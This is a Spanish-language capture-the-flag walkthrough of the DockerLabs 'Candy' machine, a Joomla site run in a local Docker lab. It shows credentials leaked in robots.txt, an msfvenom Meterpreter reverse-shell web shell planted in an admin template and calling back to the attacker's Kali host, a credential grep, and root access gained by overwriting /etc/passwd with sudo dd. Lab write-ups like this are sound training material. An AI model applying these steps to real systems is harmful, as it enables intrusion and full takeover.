# Candy

> Dificultad: Fácil

Luego de descargar el ZIP, revisé el contenido y lo descomprimí en la carpeta actual. Borré el script automático, cargué la imagen del TAR con Docker. Lanzé el contenedor mapeando el puerto 80 al 9090 del hoste para así poder acceder a la web-app gráficamente desde el navegador, sin mayores complicaciones:  

```
unzip -l <archivo.zip>
unzip <archivo.zip>
rm -f <autoscript.sh>
sudo docker load -i <archivo.tar>
sudo docker run --rm ... -p 9090:80 <imagen>
```

La IP de Candy-víctima es 172.18.0.2 y Kali-atacante, IP 172.18.0.3.

___

### FASE RECOPILACIÓN / ENUMERACIÓN:
Con nmap descubrimos que hay un solo puerto habilitado escuchando: el 80,
una web app.  
En la sub-fase de Enumeracion Web, una de las cosas más básicas es buscar por el recurso
“robots.txt” el cual define qué directorios de la web-app no pueden encontrarse por
bots/agentes (navegadores, etc):  

En http://localhost:9090/robots.txt vemos entre otras líneas:  
* Disallow: /un_caramelo `admin:c2FubHVpczEyMzQ1`  

Parecieran ser las credenciales de admin de la app.  

___

#### FASE EXPLOTACIÓN (Ganar Acceso):  

La password aparenta estar en formato base64, por lo tanto hay que descodificarla. He aquí
dos maneras:
>    1. Consultando a alguna IA
>    2.  echo “c2FubHVpczEyMzQ1” | base64 -d

Queda `admin:sanluis12345`. Las probamos y conseguimos acceso a la app. Primer Footholding.

___

#### FASE POST-EXPLOTACIÓN (Escalar Privilegios):
Revisando un poco, vamos haciendo fingerprinting de los activos. La mayoría de los datos son irrelevantes para la escalada:  

>    grupo = 'Super Users'
>    email = realmail@dockerlabs.com
>    ID = 615
  
Luego, encontramos que la versión de Joomla es 4.1.1 con un Manifest Data de 4.1.2. Esto podría ser un vector de ataque. Podríamos buscar un exploit, por ejemplo con la herramienta searchsploit, en GitHub, etc.  

Antes que nada, probaremos un camino conocido para explotar Joomla: mediante sus plantillas. Inyectando una web-shell en alguna de ellas (en su index.php, por ejemplo) podríamos llegar a tener acceso inicial:  

>    Vamos a Sistema —> Extesiones —> Admin Templates #chequear>  
>    Ahora a “/administrator/templates/atum/index.php”  

[IMG de la Plantilla]  

Vemos que está bastante interesante, así que nos vamos a construir el web-shell con
msfvenom. En mi caso, lo hice con:  

`msfvenom -p php/meterpreter/reverse_tcp LHOST=172.18.0.3 LPORT=6660 R -o web-shell.php`   

> La R corresponde a “-f raw”. Significa un formato “en crudo”, el cual es necesario para archivos PHP.  

Probamos, ahora sí, inyectar (copiar el código) de la web-shell en **“/administrator/templates/atum/index.php”** y guardamos la plantilla.    

[IMG Plantilla + WebShell]  

Una vez logrado, hay que probar si corre: vamos a http://localhost:9090/administrator.   Vemos que la página se queda cargando. Esto es indicativo de que la web-shell está funcionando. Bien, una vez está todo listo hay que preparar Meterpreter para la escucha con los mismos datos que se usaron con msfvenom:    
> 1- mfconsole  
> 2- use exploit/multi/handler  
> 3- set payload /php/meterpreter/reverse_tcp  
> 4- set lhost 172.18.0.3  
> 5- set lport 6660  
> 6- exploit (o run)  

[IMG]  

Una vez que el exploit está a la escucha hay que re-lanzar la webshell para lograr la conexión reversa con Meterpreter. He aquí 2 maneras:  
> 1. Accediedo al navegador desde el host:   
>    * http://localhost:9090/administrator
> 2. Usando curl desde Kali:
>    * curl http://172.18.0.3/administrator  

[IMG]  

Tenemos un segundo Footholding.    

#### POST-EXPLOTACIÓN (elevar privilegios):
Una vez dentro con Meterpreter, se pueden hacer muchas cosas. Primero verificamos usuario:  

`getuid`    

También podemos ejecutar `shell`:  
`whoami`  
`id`

Somos `www-data`, usuario típico administrador del servidor web del sistema, por defecto sin privilegios ni consola de login. Luego, enumeramos usuarios del sistema con:  

`cat /etc/passwd`

[IMG]  

Obtenemos dos de relevancia:  
>    1. luisillo  
>    2. ubuntu  

Ahora que tenemos por donde empezar a escalar privilegios, hay que pensar en buscar
**credenciales** dentro del sistema. Puesto que no hay un servidor SSH con el cual se pueda
pensar en realizar un ataque de diccionario (con rockyou.txt, etc), probamos buscarlas con
grep:  

`grep -RIi luisillo / 2>/dev/null`  

> /var/backups/hidden/otro_caramelo.txt:$db_user = 'luisillo';  
> /var/backups/hidden/otro_caramelo.txt:$db_pass = 'luisillosuperpassword';  

>   -R es para buscar recusivamente  
>   –I para ignorar binarios  
>   –i para ignorar los cases.  
>   2>/dev/null envía la salida de errores estándar a /dev/null, es decir no la muestra, la descarta.  

Finalmente, obtenemos las credenciales `luisillo:luisillosuperpassword`  
Siendo `www-data`, probamos desde Meterpreter:  

`shell`  
`su – luisillo`  
`Password --> luisillosuperpassword`  

Conseguimos acceso.  

Una vez como “luisillo”, probamos buscamos privilegios sudo con `sudo –l` y notamos que tenemos privilegios de superusuario sin password con el binario “/bin/dd”. Usaremos eso.  

Investigando un poco nos damos cuenta que con dd se pueden escribir archivos. Si lo usamos
con sudo escribiremos como root. Teniendo esto en cuenta, podemos pensar en escribir una
copia de /etc/passwd modificada a nuestros intereses (como cambiar la password de root) y sobreescribir el fichero legítimo como root usando dd. Primero creamos el hash para la password con openssl:  

`which openssl`  
`openssl passwd`  

Tecleamos `1234` + Enter y nos devuelve un hash para dicha contraseña.  

Copiamos /etc/passwd con:  

`cp /etc/passwd /tmp/passwd-malo`  
    
Una vez hecho, hacemos:  

`nano /tmp/passwd-malo`

Borramos la “x” de root correspondiente a la password y la cambiamos por nuestro hash. Guardamos.  

Ahora, probamos:  

`sudo /bin/dd if=/tmp/passwd-malo of=/etc/passwd`  

Vemos que no hay problema e intentamos:  

`su -`  
`Password --> 1234`    

Logrado. Somos root.
